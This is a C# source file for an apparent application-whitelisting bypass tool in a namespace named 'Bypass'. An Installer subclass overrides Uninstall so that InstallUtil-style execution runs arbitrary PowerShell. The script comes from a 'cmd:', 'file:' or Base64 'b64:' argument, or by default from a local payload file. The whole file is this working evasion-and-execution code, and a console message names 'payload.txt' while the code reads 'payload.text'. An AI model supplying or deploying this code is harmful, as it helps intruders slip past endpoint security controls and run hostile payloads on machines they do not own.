using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Text;
using System.IO;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Runs code that was supplied via a parameter");
            Sample test;
            test = new Sample();
            test.Uninstall2();
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            string cmd ="";            
            string[] cmdargs = Environment.GetCommandLineArgs();
            Int32 argcount = (cmdargs.Length) - 1;

            string Cmdline = cmdargs[argcount].Remove(0, 1);
            Int32 ffound;
            Int32 ffound1
                ;
            Int32 ffound2;

            // powershell commands parsed from the specified strings using the "cmd:" switch
            ffound = Cmdline.IndexOf("cmd:", 0, 4);
            if (ffound == 0)
            {
                cmd = Cmdline.Remove(0, 4);

            }
           
            // powershell commands parsed from teh specified File using the "file:" switch
            ffound1 = Cmdline.IndexOf("file:", 0, 5);
            if (ffound1 == 0)
            {
                string fname = Cmdline.Remove(0, 5);
                cmd = File.ReadAllText(fname);
             //   Console.Write("File Name = " + fname);
            }

            // powershell commands parsed from the specified Base64 encoded stgring passed using the "b64:" switch
            ffound2 = Cmdline.IndexOf("b64:", 0, 4);
            if (ffound2 == 0)
            {
                string fname = Cmdline.Remove(0, 4);
                cmd = Encoding.UTF8.GetString(Convert.FromBase64String(Cmdline.Remove(0, 4))); 

            }

            //Console.Write("Command = " + cmd);
            //Console.Write(" ");

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
        public void Uninstall2()
        {

            string cmd = "";
            string[] cmdargs = Environment.GetCommandLineArgs();
            Int32 argcount = (cmdargs.Length) - 1;

            string Cmdline = cmdargs[argcount].Remove(0, 1);
            Int32 ffound;
            Int32 ffound1
                ;
            Int32 ffound2;

            ffound = Cmdline.IndexOf("cmd:", 0, 4);
            if (ffound == 0)
            {
                cmd = Cmdline.Remove(0, 4);

            }


            ffound1 = Cmdline.IndexOf("file:", 0, 5);
            if (ffound1 == 0)
            {
                string fname = Cmdline.Remove(0, 5);
                cmd = File.ReadAllText(fname);
                //   Console.Write("File Name = " + fname);
            }

            ffound2 = Cmdline.IndexOf("b64:", 0, 4);
            if (ffound2 == 0)
            {
                string fname = Cmdline.Remove(0, 4);
                cmd = Encoding.UTF8.GetString(Convert.FromBase64String(Cmdline.Remove(0, 4)));
                Console.Write("B64 Command = " + cmd);


            }

            if (cmd == "")
            {
                
                cmd = File.ReadAllText("c:\\temp\\payload.text");
                Console.Write("looking for payload.txt");
            }

            //Console.Write("Command = " + cmd);
            //Console.Write(" ");

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
